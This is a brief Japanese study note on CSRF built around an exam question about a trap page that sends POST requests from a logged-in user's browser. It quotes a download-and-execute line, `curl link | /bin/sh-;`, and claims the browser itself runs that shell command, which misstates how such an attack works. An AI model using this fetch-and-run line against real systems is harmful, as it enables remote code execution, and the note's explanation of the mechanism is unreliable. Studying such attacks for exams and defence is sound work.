---
tags:
  - CSRF
---
![[Pasted image 20241103114605.png]]
![[Pasted image 20241103114547.png]]![[Pasted image 20241103114650.png]]
問題：下線部3はどのような仕組みで利用者に脆弱性B（ログイン済みの利用者に罠サイトを踏ませることで、意図せずのリクエストをWebアプリRに送信させる）を悪用して攻撃リクエストを送信させることができるか？
回答：攻撃リクエストをPOSTメソッドで送信させるスクリプトを含むページを表示させる仕組み
CSRFの手口、罠サイトに悪意のあるコードをダウンロードし、実行するコード`curl link | /bin/sh-;`を含ませ、ユーザ画面上に表示される時にBrowserによって実行される。
戸惑った点は、単なるユーザの画面上に表示するだけでは、攻撃者はどのようにネットワーク内に存在するネットワーク掃除機を見つけて、それにリクエストを送信するか点。
結論、問題の攻撃者は多分固定したIPアドレス(製品のデフォルトIP）でCSRFコードを埋めて、悪意のあるリンクを踏んだユーザがたまたま同じアドレスの設定でしたらコードを実行できるということを表現したいかもしれない。
[[CSRF]]